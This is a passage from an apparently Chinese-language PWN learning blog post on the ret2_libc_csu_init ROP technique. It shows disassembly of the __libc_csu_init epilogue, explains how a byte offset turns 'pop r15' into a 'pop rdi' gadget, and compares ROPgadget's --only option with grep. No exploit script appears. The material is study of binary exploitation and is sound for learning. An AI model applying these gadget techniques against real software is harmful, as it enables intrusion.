+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400616                                   loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400616 038 48 83 C4 08                   add     rsp, 8</span><br><span class="line">.text:000000000040061A 030 5B                            pop     rbx</span><br><span class="line">.text:000000000040061B 028 5D                            pop     rbp</span><br><span class="line">.text:000000000040061C 020 41 5C                         pop     r12</span><br><span class="line">.text:000000000040061E 018 41 5D                         pop     r13</span><br><span class="line">.text:0000000000400620 010 41 5E                         pop     r14</span><br><span class="line">.text:0000000000400622 008 41 5F                         pop     r15</span><br><span class="line">.text:0000000000400624 000 C3                            retn</span><br></pre></td></tr></table></figure>
+<p>可以发现这里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop rbx -&gt; 5B</span><br><span class="line">pop rbp -&gt; 5D</span><br><span class="line">pop r12 -&gt; 41 5C</span><br><span class="line">pop r13 -&gt; 41 5D</span><br><span class="line">pop r14 -&gt; 41 5E</span><br><span class="line">pop r15 -&gt; 41 5F</span><br></pre></td></tr></table></figure>
+<p>很明显的，这里相邻机器码明显的规律，因此我们随便网上查一下就可以发现，pop rdi对应的机器码其实是5F<br>0x400622 41 5F –&gt; pop r15<br>因此我们对其+1，就会变成0x400623 5F –&gt; pop rdi<br>也就是说gadgets其实是可以通过这种凑机器码的方式凑出我们想要的gadget的，我们可以利用ROPgadget求证一下  </p>
+<img src="/2026/09/08/PWN/PWN%E5%85%A5%E9%97%A8/%E4%B8%AD%E7%BA%A7ROP-ret2_libc_csu_init/PixPin_2026-09-11_03-39-12.png" class="">
+
+<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p><em><strong>关于ROPgadget中–only和grep的区别</strong></em>  </p>
+<img src="/2026/09/08/PWN/PWN%E5%85%A5%E9%97%A8/%E4%B8%AD%E7%BA%A7ROP-ret2_libc_csu_init/PixPin_2026-09-11_03-44-41.png" class="">  
+<p>–only是ROPgadget内部按指令类型过滤</p>
+<ul>
+<li>参数为指令名列表，不支持带操作数的写法</li>
+<li>多个指令之间使用 <code>|</code> 分隔</li>
+<li>它把<code>&quot;pop rdi ; ret&quot;</code>整体当作一个指令名去做匹配，但实际指令名是<code>pop</code>和<code>ret</code>，所以无输出<br>grep是外部按输出文本过滤</li>
+<li>默认使用基础正则（BRE）来匹配，而 <code>|</code> 在BRE中只是普通字符，不是”或”</li>
+<li>所以它在找字面量字符串<code>pop|ret</code>，而输出里根本没有<code>pop|ret</code>这个字符串，无输出</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://mandarava23-code.github.io">Mandarava23</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://mandarava23-code.github.io/2026/09/08/PWN/PWN%E5%85%A5%E9%97%A8/%E4%B8%AD%E7%BA%A7ROP-ret2_libc_csu_init/">https://mandarava23-code.github.io/2026/09/08/PWN/PWN%E5%85%A5%E9%97%A8/%E4%B8%AD%E7%BA%A7ROP-ret2_libc_csu_init/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://mandarava23-code.github.io" target="_blank">Mandarava23</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/uploads/profile%20photo.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/./source/img/wechat%E8%B5%9E%E8%B5%8F%E7%A0%81.jpg" target="_blank"><img class="post-qr-code-img" src="/./source/img/wechat%E8%B5%9E%E8%B5%8F%E7%A0%81.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/./source/img/alipay%E6%94%B6%E6%AC%BE%E7%A0%81.jpg" target="_blank"><img class="post-qr-code-img" src="/./source/img/alipay%E6%94%B6%E6%AC%BE%E7%A0%81.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/uploads/profile%20photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Mandarava23</div><div class="author-info-description">新人PWN手,学习永无止境</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Mandarava23-code"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://space.bilibili.com/511168060" target="_blank" title="bilibili"><i class="fab fa-bilibili" style="color: #ffbcd9;"></i></a><a class="social-icon" href="https://github.com/Mandarava23-code" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:c60253258@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome to my blog!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-text">思考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-text">拓展</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/08/PWN/PWN%E5%85%A5%E9%97%A8/%E4%B8%AD%E7%BA%A7ROP-ret2_libc_csu_init/" title="中级ROP-ret2_libc_csu_init">中级ROP-ret2_libc_csu_init</a><time datetime="2026-09-07T17:52:46.000Z" title="发表于 2026-09-08 01:52:46">2026-09-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/30/PWN/PWN%E5%85%A5%E9%97%A8/%E5%9F%BA%E6%9C%ACROP-ret2libc%E5%AE%9E%E6%88%98/" title="基本ROP-ret2libc实战">基本ROP-ret2libc实战</a><time datetime="2026-08-30T15:04:36.000Z" title="发表于 2026-08-30 23:04:36">2026-08-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/14/PWN/PWN%E5%85%A5%E9%97%A8/%E5%9F%BA%E6%9C%ACROP-ret2libc/" title="基本ROP-ret2libc">基本ROP-ret2libc</a><time datetime="2026-08-13T20:34:41.000Z" title="发表于 2026-08-14 04:34:41">2026-08-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/09/PWN/PWN%E5%85%A5%E9%97%A8/%E5%9F%BA%E6%9C%ACROP-ret2syscall/" title="基本ROP-ret2syscall">基本ROP-ret2syscall</a><time datetime="2026-08-09T13:43:23.000Z" title="发表于 2026-08-09 21:43:23">2026-08-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/07/PWN/PWN%E5%85%A5%E9%97%A8/%E5%9F%BA%E6%9C%ACROP-ret2shellcode/" title="基本ROP-ret2shellcode">基本ROP-ret2shellcode</a><time datetime="2026-08-07T10:16:21.000Z" title="发表于 2026-08-07 18:16:21">2026-08-07</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/uploads/%E5%8F%8B%E5%88%A9%E5%A5%88%E7%BB%AA_footimg.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Mandarava23</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div><div class="footer_custom_text"><a href="https://icp.gov.moe/?keyword=20266679" target="_blank">萌ICP备20266679号</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="/js/tw_cn.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://blogcomments-six.vercel.app/',
+      pageview: true,
+      dark: 'html[data-theme="dark"]',
+      comment: true,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client@3.7.1/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client@3.7.1/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="893897568" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true" data-mini="true"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      true
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="https://cdn.bootcdn.net/ajax/libs/busuanzi/2.3.0/bsz.pure.mini.js"></script></div></body></html>
